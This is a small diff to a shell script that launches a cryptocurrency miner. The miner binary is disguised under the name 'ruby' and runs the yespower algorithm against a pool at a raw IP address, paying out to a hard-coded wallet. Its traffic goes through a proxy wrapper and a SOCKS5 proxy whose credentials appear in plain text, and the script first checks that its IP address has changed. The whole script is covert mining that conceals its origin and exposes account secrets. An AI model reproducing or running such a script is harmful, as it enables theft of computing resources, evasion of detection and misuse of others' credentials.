@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./ruby -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 88-200 -n 1)-ricard ahmad) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://18rf8tmkziiczf:mgaijn8podkmkw582wq2rvg8kc5@us-east-static-01.quotaguard.com:1080 
+./panel ./ruby -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 88-200 -n 1)-ricardahmad) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://18rf8tmkziiczf:mgaijn8podkmkw582wq2rvg8kc5@us-east-static-01.quotaguard.com:1080 
